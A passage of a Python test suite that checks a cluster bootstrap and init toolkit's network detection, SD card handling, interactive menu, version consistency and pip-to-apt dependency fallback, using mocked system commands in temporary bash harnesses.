    if gw_val == "192.168.6.254" and "命令行" in (gw_src or ""):
        log_pass("显式 --gateway 不被自动推导覆盖 (尊重明确意图)")
    else:
        log_fail(f"显式 --gateway 被覆盖: {gw_val} ({gw_src})")

    # 4) 未换网段时保留清单网关 (不能瞎改)
    r = run_boot(["--node", "wk-edge-01", "--dry-run"])
    _, (gw_val, gw_src) = parse_net(r.stdout)
    if gw_val == "192.168.1.1" and "清单" in (gw_src or ""):
        log_pass("IP 未变更时网关保持清单值 (192.168.1.1)")
    else:
        log_fail(f"IP 未变更时网关异常: {gw_val} ({gw_src})")

    # 5) 本机探测能力 + 可关闭
    has_detect = "detect_current_network()" in src and "--no-detect" in src
    has_dry = "--dry-run" in src
    if has_detect and has_dry:
        log_pass("具备本机网络探测 (--no-detect 可关闭) 与 --dry-run 预览")
    else:
        missing = [n for n, ok in [("detect_current_network", "detect_current_network()" in src),
                                   ("--no-detect", "--no-detect" in src),
                                   ("--dry-run", has_dry)] if not ok]
        log_fail(f"缺少: {missing}")

    # 6) 配置确认页必须标注取值来源
    if "来源: ${IP_SOURCE}" in src and "来源: ${GW_SOURCE}" in src:
        log_pass("配置确认页标注了 IP/网关的取值来源")
    else:
        log_fail("配置确认页未标注来源", "用户无法判断值来自命令行、探测还是清单")

    # 7) 文档同步: README 需说明优先级与网关联动
    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "由最终 IP 推导" in readme and "自动探测当前设备" in readme:
        log_pass("README 已记录 IP/网关取值优先级与探测行为")
    else:
        log_fail("README 未说明新的取值规则", "文档与实际行为会漂移")


def test_bootstrap_sd_and_risk():
    """测试 17: bootstrap 启动探测 / SD 卡决策 / 写入前网络风险提示"""
    print("\n" + "=" * 60)
    print("测试 17: bootstrap SD 卡决策与网络风险提示")
    print("=" * 60)

    boot = PROJECT_ROOT / "scripts" / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")

    # 1) 探测必须发生在参数解析之前 (否则无法用于后续比对)
    i_detect = src.find("detect_current_network\n")
    i_args = src.find("while [[ $# -gt 0 ]]")
    if 0 <= i_detect < i_args:
        log_pass("启动即探测本机 IP/网关 (早于参数解析)")
    else:
        log_fail("本机探测未放在参数解析之前", "后续网段比对会拿不到当前网络")

    # 2) SD 探测函数与"无卡跳过"路径存在
    needed = ["detect_sd_cards()", "未检测到 SD 卡", "SD_CANDIDATES"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备 SD 卡探测与无卡跳过逻辑")
    else:
        log_fail(f"缺少 SD 卡处理: {missing}")

    # ---- 用 mock 环境做行为验证 ----
    # 注意: Git Bash 的 PATH 查找只认 POSIX 路径 (/c/...), 不认 C:/...
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t17_"))
    # 探针放临时目录而非 scripts/: 原实现写 SCRIPTS_DIR/_probe_t17.sh, 与工作区共享,
    # 一旦有并发清理 (或被人工 rm) 就会让整组 6 项以 "No such file or directory" 假失败。
    probe = tmpdir / "_probe_t17.sh"
    harness = tmpdir / "harness.sh"

    harness.write_text(f"""#!/bin/bash
set -u
BOOT="{_posix(boot)}"
PROBE="{_posix(probe)}"
M="{_posix(tmpdir)}/mockbin"
mkdir -p "$M"

cat > "$M/ip" << 'MOCKEOF'
#!/bin/bash
if [ "$1" = "-4" ] && [ "$2" = "-o" ]; then
    echo "2: eth0    inet 192.168.6.50/24 brd 192.168.6.255 scope global eth0"
    exit 0
fi
if [ "$1" = "route" ]; then
    echo "default via 192.168.6.1 dev eth0 proto dhcp src 192.168.6.50 metric 100"
    exit 0
fi
exit 0
MOCKEOF

cat > "$M/findmnt" << 'MOCKEOF'
#!/bin/bash
echo "/dev/mmcblk0p1"
MOCKEOF

cat > "$M/lsblk" << 'MOCKEOF'
#!/bin/bash
echo "mmcblk0  0 disk"
[ "${{MOCK_NO_SD:-0}}" = "1" ] || echo "mmcblk1  1 disk"
exit 0
MOCKEOF

cat > "$M/ping" << 'MOCKEOF'
#!/bin/bash
t="${{@: -1}}"
case "${{MOCK_PING_MODE:-gw}}" in
    all)  exit 0 ;;
    none) exit 1 ;;
    gw)   [ "$t" = "192.168.6.1" ] && exit 0 || exit 1 ;;
esac
MOCKEOF
chmod +x "$M"/*

# 截取到"设置主机名"之前: 只跑参数/探测/SD决策/风险提示, 绝不改动系统
LN=$(grep -n '^# ---- 2\\. 设置主机名 ----' "$BOOT" | cut -d: -f1)
sed -n "1,${{LN}}p" "$BOOT" > "$PROBE"

run() {{
    local tag="$1" nose="$2" ping="$3"
    shift 3
    echo "###CASE:$tag"
    ( cd "$(dirname "$PROBE")" \\
      && MOCK_NO_SD="$nose" MOCK_PING_MODE="$ping" PATH="$M:$PATH" \\
         bash "$(basename "$PROBE")" "$@" </dev/null 2>&1 )
}}

run sd_no_card 1 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_present 0 gw --node wk-edge-01 --ip 192.168.6.101 --dry-run
run sd_disabled 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd --dry-run
run sd_noauto 0 gw --node wk-edge-01 --ip 192.168.6.101 --no-sd-automount --dry-run
run cross_seg 0 gw --node wk-edge-01 --ip 10.0.0.9 --dry-run
run ip_clash 0 all --node wk-edge-01 --ip 192.168.6.101 --dry-run
run nodetect 0 gw --node wk-edge-01 --ip 10.0.0.9 --no-detect --dry-run
""", encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=HARNESS_TIMEOUT)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        c = case("sd_no_card")
        if "未检测到 SD 卡" in c and "将跳过" in c and "将迁移" not in c:
            log_pass("未插卡时跳过 SD 挂载与 Docker 迁移")
        else:
            log_fail("未插卡仍执行了 SD 相关步骤", c[:200])

        c = case("sd_present")
        if "将挂载" in c and "将迁移" in c and "/mnt/sd/docker" in c:
            log_pass("检测到 SD 卡后展示挂载与 Docker 迁移计划")
        else:
            log_fail("有卡时未展示挂载计划", c[:200])

        c = case("sd_disabled")
        if "已指定 --no-sd" in c and "将跳过" in c:
            log_pass("--no-sd 完全跳过 SD 相关步骤")
        else:
            log_fail("--no-sd 未生效", c[:200])

        c = case("sd_noauto")
        if "不写入 fstab" in c and "(自动挂载: 否)" in c:
            log_pass("--no-sd-automount 挂载但不写 fstab")
        else:
            log_fail("--no-sd-automount 未生效", c[:200])

        c = case("cross_seg")
        if "不在同一网段" in c and "风险" in c:
            log_pass("新 IP 与当前 IP 跨网段时告警")
        else:
            log_fail("跨网段未告警", "配完静态 IP 可能直接失联")

        c = case("cross_seg")
        if "不可达" in c:
            log_pass("网关 ping 不通时告警")
        else:
            log_fail("网关不可达未告警", c[:200])

        c = case("ip_clash")
        if "已被占用" in c:
            log_pass("目标 IP 已被占用时告警")
        else:
            log_fail("IP 冲突未告警", c[:200])

        c = case("nodetect")
        if "10.0.0.9" in c and "不在同一网段" in c:
            log_pass("--no-detect 仅停用自动采用, 仍做网段比对")
        else:
            log_fail("--no-detect 关闭了风险比对", c[:200])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)
        if probe.exists():
            probe.unlink()

    # 3) --help 不应触发探测
    r = subprocess.run(["bash", str(boot), "--help"], capture_output=True, text=True,
                       encoding="utf-8", errors="replace", stdin=subprocess.DEVNULL)
    if "本机当前网络:" not in r.stdout:
        log_pass("--help 直接输出用法, 不触发探测")
    else:
        log_fail("--help 触发了探测", "只查用法却去扫网络/磁盘")

    # 4) 文档同步
    doc_a = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    doc_b = (SCRIPTS_DIR / "README.md").read_text(encoding="utf-8")
    ok_a = ("--no-sd" in doc_a) and ("SD 卡处理" in doc_a) and ("网络安全检查" in doc_a)
    ok_b = ("--no-sd" in doc_b) and ("启动即探测" in doc_b)
    if ok_a and ok_b:
        log_pass("README 与 scripts/README 已同步新参数与新行为")
    else:
        log_fail(f"文档未同步 (README={ok_a}, scripts/README={ok_b})",
                 "用户不知道有 --no-sd 等开关")


# ============ 测试18: init 交互式入口 ============
def test_init_entrypoint():
    """测试 18: init/ 交互式入口契约 (纯交互 / 无默认参数 / 菜单齐全 / 引用脚本存在)"""
    print("\n" + "="*60)
    print("测试 18: init 交互式入口")
    print("="*60)

    init_dir = PROJECT_ROOT / "init"
    entry = init_dir / "init.sh"
    init_readme = init_dir / "README.md"

    if not entry.exists():
        log_fail("init/init.sh 不存在", "缺少交互式初始化入口")
        return
    log_pass("init/init.sh 存在")

    src = entry.read_text(encoding="utf-8")

    # 1) 基本结构
    if src.startswith("#!/bin/bash"):
        log_pass("init.sh 有 bash shebang")
    else:
        log_fail("init.sh 缺少 bash shebang")

    if "set -u" in src:
        log_pass("init.sh 启用 set -u（未定义变量尽早暴露）")
    else:
        log_fail("init.sh 未启用 set -u")

    # 2) 语法检查
    bash = shutil.which("bash")
    if bash:
        r = subprocess.run([bash, "-n", str(entry)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace")
        if r.returncode == 0:
            log_pass("init.sh 通过 bash -n 语法检查")
        else:
            log_fail(f"init.sh 语法错误: {r.stderr.strip()[:200]}")
    else:
        log_warn("未找到 bash，跳过 init.sh 语法检查")

    # 3) 纯交互：拒绝命令行参数、不预置 --yes
    if re.search(r'\[\s*"\$#"\s*-gt\s*0\s*\]', src) and "不接受任何命令行参数" in src:
        log_pass("init.sh 显式拒绝命令行参数（纯交互）")
    else:
        log_fail("init.sh 未拒绝命令行参数", "纯交互约定要求传入参数即报错退出")

    # 只看可执行代码：注释里说明"不预置 --yes"是正常表述, 不算违规
    code = "\n".join(ln for ln in src.splitlines() if not ln.lstrip().startswith("#"))

    if "--yes" not in code:
        log_pass("init.sh 未预置 --yes 等默认参数")
    else:
        log_fail("init.sh 出现 --yes", "与「不采用任何默认参数」的约定冲突")

    if "[Y/n]" not in code and "[y/N]" not in code:
        log_pass("确认提问不提供回车默认值（必须显式输入 y/n）")
    else:
        log_fail("存在 [Y/n] 式隐式默认值", "回车即采用的默认与纯交互约定不符")

    # 4) 交互基础函数齐全
    need_fns = ["menu", "read_input", "read_secret", "ask_yes_no", "pick_node", "run_script", "pause"]
    missing_fns = [fn for fn in need_fns
                   if not re.search(r'^' + re.escape(fn) + r'\(\)\s*\{', src, re.MULTILINE)]
    if missing_fns:
        log_fail(f"init.sh 缺少交互函数: {missing_fns}")
    else:
        log_pass(f"init.sh 交互基础函数齐全（{len(need_fns)} 个）")

    # 5) 主菜单功能项齐全
    need_menus = ["部署 Panel 控制面板", "部署节点", "节点维护", "配置与分发", "服务安装", "环境自检"]
    missing_menus = [m for m in need_menus if m not in src]
    if missing_menus:
        log_fail(f"init.sh 主菜单缺少功能项: {missing_menus}")
    else:
        log_pass(f"init.sh 主菜单覆盖 {len(need_menus)} 项核心功能")

    # 6) 引用的 scripts/*.sh 必须真实存在（避免菜单点进去才发现脚本没了）
    refs = sorted(set(re.findall(r'\$\{SCRIPTS_DIR\}/([A-Za-z0-9_.\-]+\.sh)', src)))
    missing_refs = [r for r in refs if not (SCRIPTS_DIR / r).exists()]
    if not refs:
        log_fail("init.sh 未引用任何 scripts/ 脚本")
    elif missing_refs:
        log_fail(f"init.sh 引用了不存在的脚本: {missing_refs}")
    else:
        log_pass(f"init.sh 引用的 {len(refs)} 个 scripts/ 脚本均存在")

    # 7) 面板安装复用既有实现，不重复造 unit
    if "${PANEL_DIR}/install-service.sh" in src and (PANEL_DIR / "install-service.sh").exists():
        log_pass("面板 systemd 安装复用 panel/install-service.sh（未重复实现）")
    else:
        log_fail("面板 systemd 安装未复用 panel/install-service.sh")

    # 8) 不硬编码集群节点 IP（统一走 lib-nodes.sh）
    real_ips = [ip for ip in load_node_ip_map().values() if ip]
    hard = [ip for ip in real_ips if ip in src]
    if hard:
        log_fail(f"init.sh 硬编码了节点 IP: {hard}", "应统一从 lib-nodes.sh 读取")
    else:
        log_pass("init.sh 未硬编码节点 IP（统一走 lib-nodes.sh）")

    # 9) 文档登记
    if init_readme.exists():
        log_pass("init/README.md 存在")
    else:
        log_fail("init/README.md 缺失")

    root_readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    if "init/init.sh" in root_readme and "init/README.md" in root_readme:
        log_pass("根 README 已登记 init 入口与文档链接")
    else:
        log_fail("根 README 未登记 init 入口", "新目录需要在根 README 可见")


# ============ 测试19: 交付物一致性 ============
def test_delivery_consistency():
    """测试 19: 版本声明一致 / 行尾防护 / 面板监听参数可注入 / 表格排版"""
    print("\n" + "="*60)
    print("测试 19: 交付物一致性")
    print("="*60)

    # 1) 版本声明四处一致 (历史上出现过 README 与 config.json 漂移)
    versions = {}

    readme = (PROJECT_ROOT / "README.md").read_text(encoding="utf-8")
    m = re.search(r'当前版本:\s*v?([0-9]+\.[0-9]+\.[0-9]+)', readme)
    if m:
        versions["README.md"] = m.group(1)

    try:
        cfg = json.loads((PANEL_DIR / "config.json").read_text(encoding="utf-8"))
        versions["panel/config.json"] = str(cfg.get("version", ""))
    except Exception as e:
        log_fail(f"panel/config.json 读取失败: {e}")

    app_src = (PANEL_DIR / "app.py").read_text(encoding="utf-8")
    m = re.search(r'"version":\s*"([0-9]+\.[0-9]+\.[0-9]+)"', app_src)
    if m:
        versions["panel/app.py"] = m.group(1)

    gen_src = (SCRIPTS_DIR / "gen-panel-config.sh").read_text(encoding="utf-8")
    m = re.search(r'ONECLOUD_PANEL_VERSION:-([0-9]+\.[0-9]+\.[0-9]+)', gen_src)
    if m:
        versions["gen-panel-config.sh"] = m.group(1)

    if len(versions) == 4 and len(set(versions.values())) == 1:
        log_pass(f"版本声明四处一致（{list(versions.values())[0]}）")
    else:
        log_fail(f"版本声明不一致: {versions}", "README / config.json / app.py / 生成脚本须同步")

    if len(versions) == 4:
        log_pass("版本号可从 README / config.json / app.py / 生成脚本四处解析到")
    else:
        log_fail(f"版本号解析不全: {sorted(versions.keys())}")

    # 2) .gitattributes: 锁定 LF, 防止 Windows checkout 出 CRLF 导致 bad interpreter
    ga = PROJECT_ROOT / ".gitattributes"
    if ga.exists():
        log_pass(".gitattributes 存在")
        ga_src = ga.read_text(encoding="utf-8")
        if re.search(r'\*[ \t]+text=auto[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 声明 * text=auto eol=lf")
        else:
            log_fail(".gitattributes 未声明 * text=auto eol=lf")
        if re.search(r'\*\.sh[ \t]+text[ \t]+eol=lf', ga_src):
            log_pass(".gitattributes 显式声明 *.sh eol=lf")
        else:
            log_fail(".gitattributes 未显式声明 *.sh eol=lf")
        if re.search(r'\*\.(png|gz|zip|deb|woff2?)\s+binary', ga_src):
            log_pass(".gitattributes 对二进制文件声明 binary（不做行尾转换）")
        else:
            log_fail(".gitattributes 未保护二进制文件")
    else:
        log_fail(".gitattributes 缺失", "Windows 工作区会被 checkout 成 CRLF")

    # 3) 实际行尾: 工作区 shell 脚本不得含 CR
    cr_scripts = []
    for sh in sorted(PROJECT_ROOT.rglob("*.sh")):
        if ".git" in sh.parts:
            continue
        try:
            if b"\r" in sh.read_bytes():
                cr_scripts.append(str(sh.relative_to(PROJECT_ROOT)).replace("\\", "/"))
        except OSError:
            pass
        if len(cr_scripts) >= 5:
            break
    if cr_scripts:
        log_fail(f"工作区 shell 脚本含 CRLF: {cr_scripts[:5]}",
                 "CRLF 会导致 bad interpreter 与变量尾部混入 \\r")
    else:
        log_pass("工作区全部 shell 脚本均为 LF 行尾")

    # 4) 面板监听参数必须可注入 (不能写死在 unit 模板里)
    inst = (PANEL_DIR / "install-service.sh").read_text(encoding="utf-8")
    if 'PANEL_PORT="${PANEL_PORT:-' in inst and 'PANEL_HOST="${PANEL_HOST:-' in inst:
        log_pass("install-service.sh 监听端口/地址来自环境变量（含默认值）")
    else:
        log_fail("install-service.sh 仍硬编码监听端口/地址",
                 "自定义端口会退化为依赖 drop-in 覆盖顺序")

    if "Environment=PANEL_PORT=${PANEL_PORT}" in inst and "Environment=PANEL_HOST=${PANEL_HOST}" in inst:
        log_pass("unit 中的 Environment= 使用注入值而非字面量")
    else:
        log_fail("unit 中 Environment= 未使用注入值")

    init_src = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "env PANEL_HOST=" in init_src and "PANEL_PORT=" in init_src:
        log_pass("init.sh 安装面板服务时注入 PANEL_HOST/PANEL_PORT（用 env 规避 sudo env_reset）")
    else:
        log_fail("init.sh 未向 install-service.sh 注入监听参数")

    # 5) 中文表头不得使用 %-Ns 按字节填充
    # 判据: printf 的「实参」里出现中文字面量, 且格式串含 %-Ns
    #   printf "  %-16s %s\n" "名称" "IP"      -> 实参有中文, 会被按字节填充 => 反模式
    #   printf "  %-24s (无固定端口)\n" "$name" -> 中文在格式串, 填充的是 ASCII 变量 => 正常
    def _first_arg(rest):
        """取 printf 之后的第一个实参文本（引号 / 命令替换 / ${} / 裸词）"""
        rest = rest.lstrip()
        if not rest:
            return ""
        ch = rest[0]
        if ch in "'\"":
            end = rest.find(ch, 1)
            return rest[:end + 1] if end > 0 else rest
        if rest.startswith("$("):
            depth = 0
            for i, c in enumerate(rest):
                if c == "(":
                    depth += 1
                elif c == ")":
                    depth -= 1
                    if depth == 0:
                        return rest[:i + 1]
            return rest
        if rest.startswith("${"):
            end = rest.find("}", 2)
            return rest[:end + 1] if end > 0 else rest
        return rest.split()[0]

    def _cjk_printf_smell(line):
        # 只看「被 %-Ns 填充的那个实参」是否含中文。
        # 中文出现在 printf 之外是正常的, 例如:
        #   "$(printf '%-15s' '0.0.0.0')   全部网卡 (含 WireGuard / 外网网卡)"
        # 填充的是 ASCII 字面量, 中文只是同一行的说明文字。
        m = re.search(r'printf\s+(?:"([^"]*)"|\'([^\']*)\'|([^\s]+))', line)
        if not m:
            return False
        fmt = next((g for g in m.groups() if g is not None), "")
        if not re.search(r'%-\d+s', fmt):
            return False
        arg = _first_arg(line[m.end():])
        return bool(re.search(r'[\u4e00-\u9fff]', arg))

    bad_tables = []
    for sh in sorted(SCRIPTS_DIR.glob("*.sh")) + [PROJECT_ROOT / "init" / "init.sh"]:
        if not sh.exists():
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            if ln.lstrip().startswith("#"):
                continue
            if _cjk_printf_smell(ln):
                bad_tables.append(f"{sh.name}:{ln_no}")
    if bad_tables:
        log_fail(f"printf 实参含中文且格式串有 %-Ns（按字节填充会错位）: {bad_tables[:5]}")
    else:
        log_pass("无「printf 实参含中文 + %-Ns」的按字节填充写法")


def test_pydeps_fallback():
    """测试 20: Python 依赖安装的降级链 (pip 缺失场景)"""
    print("\n" + "=" * 60)
    print("测试 20: Python 依赖降级链 (lib-pydeps.sh)")
    print("=" * 60)

    lib = SCRIPTS_DIR / "lib-pydeps.sh"
    if not lib.exists():
        log_fail("scripts/lib-pydeps.sh 缺失")
        return
    lsrc = lib.read_text(encoding="utf-8")

    # ---- 静态断言 ----
    needed = ["pydeps_pip_usable", "pydeps_try_ensurepip", "pydeps_try_apt_pip",
              "pydeps_try_getpip", "pydeps_try_apt_pkgs", "pydeps_verify",
              "pydeps_install", "pydeps_install_from_file"]
    missing = [n for n in needed if f"{n}()" not in lsrc]
    if not missing:
        log_pass("lib-pydeps.sh 具备完整降级链函数")
    else:
        log_fail(f"lib-pydeps.sh 缺少函数: {missing}")

    if 'python3-flask-cors' in lsrc and 'python3-flask' in lsrc:
        log_pass("具备发行版包 (apt) 兜底映射")
    else:
        log_fail("缺少 apt 包名映射", "pip 不可用时无法兜底")

    # 调用方必须复用同一实现, 不得再各自拼 pip 命令
    dup = []
    for sh in [PROJECT_ROOT / "init" / "init.sh", SCRIPTS_DIR / "setup.sh",
               SCRIPTS_DIR / "install-services.sh", SCRIPTS_DIR / "lib-pydeps.sh"]:
        if not sh.exists():
            continue
        if sh.name == "lib-pydeps.sh":
            continue
        for ln_no, ln in enumerate(sh.read_text(encoding="utf-8").splitlines(), 1):
            s = ln.strip()
            if s.startswith("#"):
                continue
            if re.search(r'(^|\s|\|)pip3\s+install', ln):
                dup.append(f"{sh.name}:{ln_no}")
    if not dup:
        log_pass("无脚本再直接调用裸 pip3 (统一走 lib-pydeps.sh)")
    else:
        log_fail(f"仍有裸 pip3 调用: {dup[:4]}", "pip 缺失时会 command not found")

    # init.sh 必须 source 该库
    isrc = (PROJECT_ROOT / "init" / "init.sh").read_text(encoding="utf-8")
    if "lib-pydeps.sh" in isrc and "panel_install_deps" in isrc:
        log_pass("init.sh 已接入 lib-pydeps.sh")
    else:
        log_fail("init.sh 未接入 lib-pydeps.sh")

    # 关键: panel_install_deps 不能只靠 --break-system-packages 救场
    if "pydeps_pip_usable" in isrc and "python3-pip" in isrc:
        log_pass("init.sh 会先检测 pip 是否可用, 并具备补齐路径")
    else:
        log_fail("init.sh 未检测 pip 可用性",
                 "--break-system-packages 补不了缺失的 pip 自身")

    # ---- 行为验证: 用 mock 解释器/包管理器跑真实降级链 ----
    def _posix(p):
        s = Path(p).as_posix()
        m = re.match(r"^([A-Za-z]):/(.*)$", s)
        return f"/{m.group(1).lower()}/{m.group(2)}" if m else s

    tmpdir = Path(tempfile.mkdtemp(prefix="oc_t20_"))
    harness = tmpdir / "harness.sh"

    tmpl = r'''#!/bin/bash
set -u
LIB="__LIB__"
ROOT="__ROOT__"
M="$ROOT/mockbin"
mkdir -p "$M"

cat > "$M/python3" << 'PYMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
log() { printf '%s\n' "$*" >> "$SD/calls"; }
mod_of() { printf '%s' "$1" | tr '-' '_'; }
case "${1:-}" in
  -m)
    shift
    case "${1:-}" in
      pip)
        shift
        if [ ! -f "$SD/pip" ]; then echo "No module named pip" >&2; exit 1; fi
        case "${1:-}" in
          --version) echo "pip 24.0"; exit 0 ;;
          install)
            shift
            brk=0; args=""
            for a in "$@"; do
              if [ "$a" = "--break-system-packages" ]; then brk=1; continue; fi
              case "$a" in -*) continue ;; esac
              args="$args $a"
            done
            if [ "$brk" = "1" ]; then
              log "pip install --break-system-packages$args"
              [ "${S_break:-0}" = "1" ] || { echo "error" >&2; exit 1; }
            else
              log "pip install$args"
              [ "${S_plain:-0}" = "1" ] || { echo "externally-managed-environment" >&2; exit 1; }
            fi
            if [ "${S_touch:-1}" = "1" ]; then
              for a in $args; do : > "$SD/inst_$(mod_of "$a")"; done
            fi
            exit 0
            ;;
        esac
        exit 1
        ;;
      ensurepip)
        log "ensurepip"
        if [ "${S_ensurepip:-0}" = "1" ]; then : > "$SD/pip"; exit 0; fi
        echo "No module named ensurepip" >&2
        exit 1
        ;;
    esac
    exit 1
    ;;
  -c)
    mods="$(printf '%s' "${2:-}" | sed -e 's/^import //' -e 's/,/ /g')"
    for m in $mods; do [ -f "$SD/inst_$m" ] || exit 1; done
    exit 0
    ;;
esac
exit 1
PYMOCK

cat > "$M/apt-get" << 'APTMOCK'
#!/bin/bash
SD="${MOCK_STATE:-/tmp/nostate}"
[ "${1:-}" = "update" ] && exit 0
[ "${1:-}" = "install" ] || exit 1
shift
pkgs=""
for a in "$@"; do
  case "$a" in -*) continue ;; esac
  pkgs="$pkgs $a"
done
printf 'apt-get install%s\n' "$pkgs" >> "$SD/calls"
for p in $pkgs; do
  if [ "$p" = "python3-pip" ]; then
    if [ "${S_apt_pip:-0}" = "1" ]; then : > "$SD/pip"; else exit 1; fi
    continue
  fi
  case " ${S_avail:-} " in
    *" $p "*) : > "$SD/inst_$(printf '%s' "$p" | sed -e 's/^python3-//' -e 's/-/_/g')" ;;
    *) exit 1 ;;
  esac
done
exit 0
APTMOCK

# 断网: 让 get-pip.py 兜底快速失败, 保证测试确定性
printf '#!/bin/bash\nexit 1\n' > "$M/curl"
cp "$M/curl" "$M/wget"
chmod +x "$M"/*

scenario() {
    local name="$1" plain="$2" brk="$3" ens="$4" aptpip="$5" avail="$6" touch="$7" pre="$8"
    local SC="$ROOT/$name"
    mkdir -p "$SC"          # ROOT 由 mktemp 新建, 每个 SC 都是全新目录, 无需 rm
    local p
    for p in $pre; do : > "$SC/inst_$p"; done
    [ "${9:-0}" = "1" ] && : > "$SC/pip"
    echo "###CASE:$name"
    # 固定 PATH: 只留本仓 mock 与系统工具。宿主 shell 会往 PATH 注入
    # rm 安全 shim, 而这类 shim 会对 rm -rf 发起确认并挂起, 必须绕开。
    MOCK_STATE="$SC" S_plain="$plain" S_break="$brk" S_ensurepip="$ens" \
    S_apt_pip="$aptpip" S_avail="$avail" S_touch="$touch" \
    PATH="$M:/usr/bin:/bin" \
        bash -c '
            source "$0"
            pydeps_install "$1" "flask flask-cors" ""
            rc=$?
            echo "RC=$rc"
            if [ "$rc" != "0" ]; then pydeps_hint "flask flask-cors" "$1" ""; fi
        ' "$LIB" python3 2>&1 | sed 's/^/    /'
    echo "    CALLS: $(cat "$SC/calls" 2>/dev/null | tr '\n' '|')"
}

scenario already_ok   0 0 0 0 ""                 1 "flask flask_cors" 0
scenario pip_plain    1 0 0 0 ""                 1 "" 1
scenario pep668       0 1 0 0 ""                 1 "" 1
scenario via_ensure   1 0 1 0 ""                 1 "" 0
scenario via_apt_pip  0 1 0 1 ""                 1 "" 0
scenario via_apt_pkg  0 0 0 0 "python3-flask python3-flask-cors" 1 "" 0
scenario all_fail     0 0 0 0 ""                 1 "" 0
scenario pip_lied     1 0 0 0 "python3-flask python3-flask-cors" 0 "" 1
'''
    harness.write_text(
        tmpl.replace("__LIB__", _posix(lib)).replace("__ROOT__", _posix(tmpdir)),
        encoding="utf-8")

    try:
        r = subprocess.run(["bash", str(harness)], capture_output=True, text=True,
                           encoding="utf-8", errors="replace",
                           stdin=subprocess.DEVNULL, timeout=240)
        out = r.stdout

        def case(tag):
            m = re.search(rf"###CASE:{tag}\n(.*?)(?=\n###CASE:|\Z)", out, re.S)
            return m.group(1) if m else ""

        checks = [
            ("pip_plain", "RC=0", "pip install flask flask-cors", "常规 pip 路线"),
            ("pep668", "RC=0", "pip install --break-system-packages flask flask-cors",
             "PEP 668 时自动加 --break-system-packages"),
            ("via_ensure", "RC=0", "ensurepip", "ensurepip 补齐 pip"),
            ("via_apt_pip", "RC=0", "apt-get install python3-pip",
             "pip 缺失时用 apt 补齐 python3-pip"),
            ("via_apt_pkg", "RC=0", "apt-get install python3-flask python3-flask-cors",
             "pip 完全不可用时改走发行版包"),
            ("all_fail", "RC=1", "--break-system-packages flask", "彻底失败时给出手工命令"),
            ("pip_lied", "RC=0", "apt-get install python3-flask", "pip 谎报成功时靠 import 校验兜住"),
        ]
        for tag, want_rc, want_call, desc in checks:
            c = case(tag)
            ok = want_rc in c and want_call in c
            if ok:
                log_pass(desc)
            else:
                log_fail(f"{desc} —— 用例 {tag} 不符合预期",
                         f"缺 [{want_rc}] 或 [{want_call}]; 实际: {c.strip()[:180]}")

        # 依赖已齐时必须完全不动包管理器
        c = case("already_ok")
        if "依赖已就绪" in c and "pip install" not in c and "apt-get" not in c:
            log_pass("依赖已齐时直接返回, 不调用 pip/apt")
        else:
            log_fail("依赖已齐时仍调用了包管理器", c.strip()[:180])

        # via_apt_pip 场景不得退回装发行版包 (顺序必须是先补 pip)
        c = case("via_apt_pip")
        if "apt-get install python3-flask" not in c:
            log_pass("补齐 pip 成功后不再多装发行版包 (降级顺序正确)")
        else:
            log_fail("补齐 pip 后仍安装了发行版包", "降级顺序不符预期")

        # all_fail 必须给出可复制的手工命令
        c = case("all_fail")
        if "pip install --break-system-packages" in c and "apt-get install -y python3-flask" in c:
            log_pass("失败提示含 pip 与 apt 两条可复制命令")
        else:
            log_fail("失败提示缺少可复制命令", c.strip()[:180])
    finally:
        shutil.rmtree(tmpdir, ignore_errors=True)


# ============ 测试21: bootstrap apt 源与依赖安装回归 ============
def test_bootstrap_apt_sources():
    """测试 21: apt 源按系统代号渲染 / apt 失败诊断 / wireguard-dkms 条件安装

    背景: 老实现把 sources.list 写死成 bullseye, 且在基础工具里无条件安装
    wireguard-dkms。Debian 12 已移除该包, apt 会以退出码 100 失败, 又被
    set -e 原样透传出去, 现场只看到一个裸 100, 无法定位。
    """
    print("\n" + "=" * 60)
    print("测试 21: bootstrap apt 源与依赖安装回归")
    print("=" * 60)

    boot = SCRIPTS_DIR / "bootstrap.sh"
    if not boot.exists():
        log_fail("scripts/bootstrap.sh 缺失")
        return
    src = boot.read_text(encoding="utf-8")
    lines = src.splitlines()

    # ---- 1) 静态检查: 不允许再写死 bullseye / 不允许无条件装 dkms ----
    if re.search(r"deb\s+https?://\S+\s+bullseye\s", src):
        log_fail("bootstrap.sh 仍写死 bullseye 源", "Debian 12 机器会被写入错误代号")
    else:
        log_pass("apt 源不再写死 bullseye (按系统代号渲染)")

    if "wireguard-tools wireguard-dkms" in src:
        log_fail("基础工具仍无条件安装 wireguard-dkms", "Debian 12 起该包已移除 -> apt 退出 100")
    else:
        log_pass("wireguard-dkms 不再出现在无条件安装列表")

    needed = ["detect_distro()", "apt_components_for()", "wireguard_kernel_builtin()",
              "configure_apt_sources()", "apt_run()", "apt_try()"]
    missing = [n for n in needed if n not in src]
    if not missing:
        log_pass("具备发行版探测 / 源写入 / apt 失败诊断等辅助函数")
    else:
        log_fail(f"缺少辅助函数: {missing}")

    if "apt-cache show wireguard-dkms" in src and "apt_run \"安装 wireguard-dkms\"" in src:
